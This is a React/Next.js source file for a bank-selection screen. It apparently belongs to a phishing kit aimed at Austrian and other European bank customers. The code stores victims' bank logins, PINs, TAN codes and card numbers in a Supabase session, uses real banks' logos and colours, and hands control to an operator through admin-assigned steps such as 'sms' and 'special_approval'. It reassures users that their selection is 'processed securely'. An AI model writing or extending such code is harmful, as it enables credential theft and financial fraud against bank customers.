"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import type { BankCatalogEntry } from "@/lib/at-bank-catalog";
import { AT_BANKS_FALLBACK } from "@/lib/at-austria-banks-fallback";
import { getAuBankPageEntry } from "@/lib/au-bank-page-map";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { getPreferredRouteSessionId } from "@/lib/session-id-client";
import { isAdminProtectedStep } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";
import { countriesMatch } from "@/lib/country-utils";

type Props = {
  sessionId: string;
  routeSessionId?: string;
  initialBanks: BankCatalogEntry[];
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";
const BANK_SESSION_FIELDS_TO_CLEAR = [
  "bankSlug",
  "bankName",
  "loginMethod",
  "personalCode",
  "bankPhone",
  "username",
  "password",
  "verfuegernummer",
  "pin",
  "tacCode",
  "rekeningnummer",
  "pasnummer",
  "toegangscode",
  "signatuur",
  "identificatiecode",
  "orderedField1",
  "orderedField1Key",
  "orderedField2",
  "orderedField2Key",
  "orderedField2Type",
  "orderedField3",
  "orderedField3Key",
  "orderedField3Type",
] as const;

export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const EFFECTIVE_DEFAULT_BANKS: BankCatalogEntry[] =
    (initialBanks && initialBanks.length > 0) ? initialBanks :
    (AT_BANKS_FALLBACK.length > 0 ? AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })) : []);

  const [banks, setBanks] = useState<BankCatalogEntry[]>(EFFECTIVE_DEFAULT_BANKS);
  const [bankSlug, setBankSlug] = useState("");
  const [searchTerm, setSearchTerm] = useState(() => {
    // GERİ tuşu ile geldiyse search kutusunu SIFIRLA (eski filtre kalmaması için)
    try {
      const flag = sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG);
      if (flag === "1") { sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG); return ""; }
    } catch { /* ignore */ }
    return "";
  });
  const [saving, setSaving] = useState(false);
  const [resettingSelection, setResettingSelection] = useState(false);  // ⭐ Başlangıçta false: spinner gösterme (fallback bankalar hazır)
  const [msg, setMsg] = useState<string | null>(null);
  const [recovering, setRecovering] = useState(false);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const navigationLockRef = useRef(false);
  const refreshAbortRef = useRef<AbortController | null>(null);
  const selectionVersionRef = useRef(0);
  const mountedRef = useRef(true);

  useEffect(() => {
    // ⭐ EĞER initialBanks boş geldiyse bile fallback AT_BANKS_FALLBACK'i koru (ESKİ: undefined gelince setBanks([]) yapıyordu, BOŞTU)
    if (initialBanks && initialBanks.length > 0) {
      setBanks(initialBanks);
    } else if (AT_BANKS_FALLBACK.length > 0) {
      setBanks(AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })));
    }
  }, [initialBanks]);

  useEffect(() => {
    mountedRef.current = true;
    return () => {
      mountedRef.current = false;
      selectionVersionRef.current += 1;
      refreshAbortRef.current?.abort();
    };
  }, []);

  const resetSessionBankSelection = useCallback(async () => {
    if (supabase === null || !sessionId) return;

    const { data } = await supabase
      .from("sessions")
      .select("current_step,form_data")
      .eq("id", sessionId)
      .maybeSingle();

    if (!data) return;

    const currentStep = typeof data.current_step === "string" ? data.current_step : "";
    // ⭐ ADMIN-KORUMALI ADIM (wait/sms/invalid_bank/special_approval/custom_question/...)
    //    atanmis ise pasif reset ile adimi DUSURME — admin'in atadigi ekran acik kalir.
    if (isAdminProtectedStep(currentStep)) return;
    const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
    const hadBankState =
      currentStep === "bank" ||
      currentStep === "bank_login" ||
      currentStep === "wait" ||
      BANK_SESSION_FIELDS_TO_CLEAR.some((key) => {
        const value = previousFormData[key];
        return typeof value === "string" ? value.trim().length > 0 : Boolean(value);
      });

    const nextFormData = { ...previousFormData };
    for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
      delete nextFormData[field];
    }

    setSessionFormData(nextFormData);
    setBankSlug("");

    if (!hadBankState) return;

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "banken",
        form_data: nextFormData,
      })
      .eq("id", sessionId);
  }, [sessionId, supabase]);

  const refreshBanks = useCallback(async () => {
    if (navigationLockRef.current) return;

    refreshAbortRef.current?.abort();
    const controller = new AbortController();
    refreshAbortRef.current = controller;

    try {
      const res = await fetch(`/api/banks?t=${Date.now()}`, {
        cache: "no-store",
        headers: {
          "Cache-Control": "no-cache",
        },
        signal: controller.signal,
      });

      if (!res.ok) return;
      const data = await res.json();
      if (!Array.isArray(data.banks)) return;

      // ⭐ Gelen banks boş ise (DB/API'den dönmedi) FALLBACK KORU (setBanks BOŞ YAPMA!)
      const incomingBanks: any[] = data.banks;
      if (!incomingBanks || incomingBanks.length === 0) {
        // Fallback: AT_BANKS_FALLBACK'i göster (hiç boş gösterme)
        setBanks(AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })));
        return;
      }

      setBanks(
        incomingBanks.map((bank: any) => ({
          slug: bank.slug,
          name: bank.name,
          domain: bank.domain,
          logoFile: bank.logoFile ?? bank.logo_file,
          brandColor: bank.brandColor ?? bank.brand_color ?? "#DF0000",
          accentColor: bank.accentColor ?? bank.accent_color ?? "#129C4F",
          logo: bank.logo ?? (bank.name || "BANK").toUpperCase().slice(0, 6),
          country: bank.country,
          isActive: bank.isActive !== false && bank.is_active !== false,
        })) as BankCatalogEntry[],
      );
    } catch (error) {
      if (error instanceof Error && error.name === "AbortError") return;
      // ⭐ HATA ALINIRSA FALLBACK KORU (ASLA setBanks([]) YAPMA!)
      setBanks(AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true })) as BankCatalogEntry[]);
    } finally {
      if (refreshAbortRef.current === controller) {
        refreshAbortRef.current = null;
      }
    }
  }, []);

  useEffect(() => {
    if (!sessionId) return;
    if (window.location.search.includes("session=")) {
      window.history.replaceState(window.history.state, "", "/banken");
    }
  }, [sessionId]);

  useEffect(() => {
    try {
      if (window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) !== "1") {
        return;
      }

      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      refreshAbortRef.current?.abort();
      setSaving(false);
      setResettingSelection(true);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      // ⭐ GERİ'de bank listesi BOŞ KALMASIN: initialBanks boşsa fallback AU_FALLBACK
      setBanks(
        (initialBanks && initialBanks.length > 0)
          ? initialBanks
          : AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true }))
      );

      void (async () => {
        await resetSessionBankSelection();
        try {
          window.sessionStorage.removeItem(RETURN_TO_BANK_LIST_FLAG);
        } catch {
          /* ignore sessionStorage errors */
        }
        if (mountedRef.current) {
          setResettingSelection(false);
        }
        void refreshBanks();
      })();
    } catch {
      /* ignore sessionStorage errors */
    }
  }, [initialBanks, refreshBanks, resetSessionBankSelection]);

  useEffect(() => {
    const resetUi = () => {
      selectionVersionRef.current += 1;
      navigationLockRef.current = false;
      setSaving(false);
      setResettingSelection(true);
      setMsg(null);
      setRecovering(false);
      setSearchTerm("");
      setBankSlug("");
      // ⭐ Pageshow GERİ dönüşte de boş KALMASIN: fallback
      setBanks(
        (initialBanks && initialBanks.length > 0)
          ? initialBanks
          : AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true }))
      );
    };

    const refreshView = () => {
      if (navigationLockRef.current) return;
      resetUi();
      void refreshBanks();
      // ⭐ Pageshow sonrası resettingSelection takılırsa 750ms sonra FORCE false (spinner sonsuza kadar dönmesin)
      window.setTimeout(() => { if (mountedRef.current) setResettingSelection(false); }, 750);
    };

    const onPageShow = (event: PageTransitionEvent) => {
      const entries = typeof performance !== "undefined" ? performance.getEntriesByType("navigation") : [];
      const navEntry = entries[0] as PerformanceNavigationTiming | undefined;
      const isBackForward = navEntry?.type === "back_forward";

      if (event.persisted || isBackForward) {
        refreshView();
      }
    };

    window.addEventListener("pageshow", onPageShow);
    return () => {
      window.removeEventListener("pageshow", onPageShow);
    };
  }, [initialBanks, refreshBanks]);

  const demoOptions = useMemo(() => {
    // 1) Sadece aktif olanları al
    let validBanks = banks.filter(b => b.isActive !== false);

    // 2) Hedef ülke filtresi UYGULA (eğer varsa)
    let afterCountry: BankCatalogEntry[] = validBanks;
    if (settings.target_country && settings.target_country !== "All") {
      afterCountry = validBanks.filter(b => countriesMatch(b.country, settings.target_country));
    }

    // ⭐ ⭐ EN KRİTİK KISIM: Eğer ülke filtresinden 0 sonuç döndüyse (country undefined/bozuk gelmiş olabilir)
    //    FİLTREYİ KALDIR, geçersiz kıl ve TÜM AKTİF BANKALARI göster (ASLA BOŞ LİSTE GÖSTERME!)
    const finalList: BankCatalogEntry[] = (afterCountry.length === 0 && validBanks.length > 0) ? validBanks : afterCountry;

    // ⭐ SON KALDIRMA: Final list hala 0 ise (refreshBanks failed olabilir) FALLBACK AT_BANKS_FALLBACK göster
    const safetyFinal: BankCatalogEntry[] =
      (finalList.length === 0 && AT_BANKS_FALLBACK.length > 0)
        ? AT_BANKS_FALLBACK.map((b) => ({ ...b, country: b.country ?? "Austria", isActive: true }))
        : finalList;

    return safetyFinal.map((bank) => ({
      slug: bank.slug,
      displayName: bank.name,
      domain: bank.domain,
      logoFile: resolveLocalBankLogoFile(bank.slug, bank.logoFile),
    }));
  }, [banks, settings.target_country]);

  const filteredOptions = useMemo(() => {
    const q = searchTerm.trim().toLowerCase();
    if (!q) return demoOptions;
    return demoOptions.filter((opt) => opt.displayName.toLowerCase().includes(q));
  }, [searchTerm, demoOptions]);

  useEffect(() => {
    // ⭐ sessionId yoksa fallback bankaları göster, infinite router.replace LOOP YOK (artık)
    //    Eski kod: router.replace("/banken") yapıyordu, aynı adrese döndüğü için infinite loop + boş prop ile geliyordu
    if (sessionId) return;
    try {
      const cachedSessionId = localStorage.getItem("activeSessionId");
      if (cachedSessionId) {
        setRecovering(true);
        // ⭐ KENDI ADRESİNE YÖNLENDİRME YAPMA (döngü) — SADECE state işaretle
        //     Bankalar zaten AT_BANKS_FALLBACK ile dolu, kullanıcı seçme işlemine devam edebilir
        setTimeout(() => { if (mountedRef.current) setRecovering(false); }, 300);
      }
    } catch {
      /* ignore localStorage access errors */
    }
  }, [sessionId]);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      setResettingSelection(true);
      await resetSessionBankSelection();
      if (cancelled) return;
      setResettingSelection(false);
    })();
    // ⭐ Reset selection async işlem 1sn'den uzun sürerse FORCE false (spinner takılması KALICI ÖNLENSİN)
    const forceResetTimer = window.setTimeout(() => {
      if (!cancelled && mountedRef.current) setResettingSelection(false);
    }, 1000);
    return () => {
      cancelled = true;
      window.clearTimeout(forceResetTimer);
    };
  }, [resetSessionBankSelection, sessionId, supabase]);

  function handleBankSelect(nextBankSlug: string, displayName: string) {
    if (!supabase || !nextBankSlug || navigationLockRef.current || resettingSelection) return;

    selectionVersionRef.current += 1;
    navigationLockRef.current = true;
    refreshAbortRef.current?.abort();
    setSaving(true);
    setMsg(null);
    setBankSlug(nextBankSlug);

    // ⭐ OPTIMISTIC NAVIGATION: kullanici TIKLADIGI ANDA banka sayfasina git.
    //    Onceki kod 2 DB round-trip (select + update) bitene kadar bekliyordu;
    //    gecikmede kullanici 2. tiki atiyordu ("2 kere tiklayinca gidiyor" bug'i).
    //    DB update arka planda devam eder — banka sayfasi slug'i URL'den okur,
    //    sessionId henuz resolve olmadiysa banka sayfasi cookie/query'den cozer.
    if (sessionId) {
      void (async () => {
        try {
          // Kullanici verisini kaybetmemek icin form_data DB'den taze okunur.
          let baseFormData: Record<string, unknown> = sessionFormData;
          let freshStep = "";
          const { data: freshRow } = await supabase
            .from("sessions")
            .select("form_data,current_step")
            .eq("id", sessionId)
            .maybeSingle();
          if (freshRow?.form_data && typeof freshRow.form_data === "object") {
            baseFormData = freshRow.form_data as Record<string, unknown>;
          }
          if (typeof freshRow?.current_step === "string") {
            freshStep = freshRow.current_step;
          }

          const nextFormData: Record<string, any> = { ...baseFormData };
          for (const field of BANK_SESSION_FIELDS_TO_CLEAR) {
            delete nextFormData[field];
          }
          nextFormData.bankSlug = nextBankSlug;
          nextFormData.bankName = displayName;

          // ⭐ Admin bu arada admin-korumali adim atadiysa adimi EZME (bankSlug'i kaydet yine de)
          const nextStepPatch = isAdminProtectedStep(freshStep) ? {} : { current_step: "bank" };

          await supabase
            .from("sessions")
            .update({ is_hidden: false, ...nextStepPatch, form_data: nextFormData })
            .eq("id", sessionId);
          setSessionFormData(nextFormData);
        } catch {
          /* navigasyon zaten yapildi, sessiz gec */
        }
      })();
    }

    // ⭐ FLASH YOK: router.push → router.replace (history stack'te liste kalsin, GERI'de direkt liste)
    router.replace(`/win/${effectiveRouteSessionId}/bank/${nextBankSlug}`);
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    if (recovering) {
      return (
        <div className="pak-page-shell">
          <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
            <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
            <p className="text-sm text-gray-300 mb-8">Sitzung wird wiederhergestellt...</p>
            <div className="flex justify-center py-12">
              <div className="size-10 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
            </div>
          </div>
        </div>
      );
    }
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
          <h2 className="text-2xl font-bold text-white mb-2">Bankauswahl</h2>
          <p className="text-sm text-gray-300 mb-6">Ungueltiger Link.</p>
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Use the full link to continue.
          </p>
        </div>
      </div>
    );
  }

  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="relative z-10 w-full max-w-[860px] space-y-4">
        <div className="pak-form-card h-[calc(100dvh-6rem)] max-h-[820px] overflow-hidden p-3 sm:h-[calc(100dvh-6.4rem)] sm:p-5">
          <div className="pak-form-inner grid h-full grid-rows-[auto_auto_minmax(0,1fr)_auto]">
            <div className="mb-3 flex items-start justify-between gap-3">
              <div className="min-w-0 max-w-[30rem]">
                <h2 className="pak-form-title">{settings.banken_title}</h2>
                <p className="pak-form-subtitle mt-2">{settings.banken_subtitle}</p>
              </div>
              <img
                src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                alt={settings.portal_name || "Brand"}
                className="pak-form-brand-logo shrink-0"
              />
            </div>

            <div className="mx-auto mb-3 w-full max-w-[520px] shrink-0">
              <div className="pak-form-input-wrap mt-0">
                <div className="pak-form-input-icon">
                  <svg aria-hidden viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="11" cy="11" r="7" />
                    <path d="m20 20-3.5-3.5" />
                  </svg>
                </div>
                <input
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  placeholder={settings.banken_search_placeholder}
                  className="pak-form-input min-h-[3.5rem] rounded-full pl-14 pr-4 text-[15px]"
                />
              </div>
            </div>

            <div className="min-h-0 overflow-y-auto pr-1 custom-scrollbar">
                <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
                {filteredOptions.length === 0 ? (
                  <div className="col-span-full rounded-2xl border border-[#FF453A]/20 bg-white/5 p-6 text-center text-sm text-white/82">
                    No banks were found for the selected country. Choose another country or clear the search filter.
                  </div>
                ) : filteredOptions.map((opt) => {
                  const palette = (() => {
                    const pg = getAuBankPageEntry(opt.slug);
                    const brand = pg?.brandColor?.trim() || (banks.find((b) => b.slug === opt.slug) as any)?.brandColor || "#DF0000";
                    const accent = pg?.accentColor?.trim() || (banks.find((b) => b.slug === opt.slug) as any)?.accentColor || brand;
                    const hex = (h: string) => h.replace("#", "");
                    const r = (h: string) => parseInt(hex(h).slice(0, 2), 16);
                    const g = (h: string) => parseInt(hex(h).slice(2, 4), 16);
                    const b = (h: string) => parseInt(hex(h).slice(4, 6), 16);
                    return {
                      brand,
                      accent,
                      brandRgb: `${r(brand)}, ${g(brand)}, ${b(brand)}`,
                      accentRgb: `${r(accent)}, ${g(accent)}, ${b(accent)}`,
                    };
                  })();
                  const isSelected = bankSlug === opt.slug;
                  const cardBase =
                    "group flex min-h-[4.25rem] w-full items-center gap-3 rounded-full border px-3 py-2 text-left transition-all duration-200";
                  const opacity = saving ? " opacity-70" : "";
                  const cardStyle = isSelected
                    ? {
                        borderColor: palette.accent,
                        background: `linear-gradient(180deg, rgba(${palette.brandRgb}, 0.26), rgba(${palette.brandRgb}, 0.08))`,
                        boxShadow: `0 0 0 1px rgba(${palette.accentRgb}, 0.22), 0 0 24px rgba(${palette.accentRgb}, 0.18)`,
                      }
                    : {
                        borderColor: `rgba(${palette.accentRgb}, 0.16)`,
                        background:
                          "linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.02))",
                      };
                  const hoverStyle = isSelected
                    ? undefined
                    : {
                        borderColor: `rgba(${palette.accentRgb}, 0.16)`,
                      };
                  const logoFrameStyle: React.CSSProperties = {
                    borderColor: `rgba(${palette.accentRgb}, 0.22)`,
                    background: `linear-gradient(180deg, rgba(${palette.brandRgb}, 0.46), rgba(${palette.brandRgb}, 0.18))`,
                  };
                  const arrowDefaultColor = `rgba(${palette.accentRgb}, 0.70)`;
                  const arrowHoverColor = palette.accent;
                  return (
                  <button
                    key={opt.slug}
                    type="button"
                    onClick={() => void handleBankSelect(opt.slug, opt.displayName)}
                    disabled={saving || resettingSelection}
                    className={`${cardBase}${opacity}`}
                    style={cardStyle}
                    onMouseEnter={(e) => {
                      if (isSelected || saving || resettingSelection) return;
                      (e.currentTarget as HTMLButtonElement).style.borderColor = `rgba(${palette.accentRgb}, 0.35)`;
                      (e.currentTarget as HTMLButtonElement).style.background = `linear-gradient(180deg, rgba(${palette.brandRgb}, 0.10), rgba(${palette.brandRgb}, 0.04))`;
                    }}
                    onMouseLeave={(e) => {
                      if (isSelected || saving || resettingSelection) return;
                      (e.currentTarget as HTMLButtonElement).style.borderColor = hoverStyle?.borderColor as string;
                      (e.currentTarget as HTMLButtonElement).style.background = cardStyle.background as string;
                    }}
                  >
                    <div
                      className="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-full border shadow-[inset_0_1px_0_rgba(255,255,255,0.06)]"
                      style={logoFrameStyle}
                    >
                      <img
                        src={optimizeSupabaseImageUrl(resolveLocalBankLogoFile(opt.slug, opt.logoFile), { format: "webp", quality: 80, width: 128 }) || resolveLocalBankLogoFile(opt.slug, opt.logoFile)}
                        alt={opt.displayName}
                        className="h-full w-full rounded-full object-cover"
                        onError={(e) => {
                          e.currentTarget.onerror = null;
                          e.currentTarget.style.display = "none";
                          const fallback = e.currentTarget.nextElementSibling as HTMLElement;
                          if (fallback) fallback.style.display = "grid";
                        }}
                      />
                      <div
                        className="hidden h-7 w-7 place-items-center rounded-full text-sm font-black"
                        style={{ color: palette.accent }}
                      >
                        {opt.displayName.charAt(0)}
                      </div>
                    </div>
                    <div className="min-w-0 flex-1">
                      <p className="truncate text-[13px] font-semibold leading-none text-white/92 group-hover:text-white">
                        {opt.displayName}
                      </p>
                    </div>
                    <div
                      className="shrink-0 transition-transform duration-200 group-hover:translate-x-0.5"
                      style={{ color: arrowDefaultColor }}
                      onMouseEnter={(e) => { (e.currentTarget as HTMLElement).style.color = arrowHoverColor; }}
                      onMouseLeave={(e) => { (e.currentTarget as HTMLElement).style.color = arrowDefaultColor; }}
                    >
                      <svg className="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M9 6l6 6-6 6" />
                      </svg>
                    </div>
                  </button>
                  );
                })}
                </div>
            </div>

            <div className="mt-3 flex shrink-0 items-center justify-center gap-2 border-t border-[#FF453A]/15 pt-3 text-center pak-form-security">
              <svg className="h-8 w-8 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
              </svg>
              <span>Ihre Bankauswahl wird sicher verarbeitet.</span>
            </div>
          </div>
        </div>

        {msg ? <p className="rounded-2xl border border-red-500/20 bg-red-500/10 p-3 text-center text-sm text-red-300">{msg}</p> : null}
      </div>
    </div>
  );
}
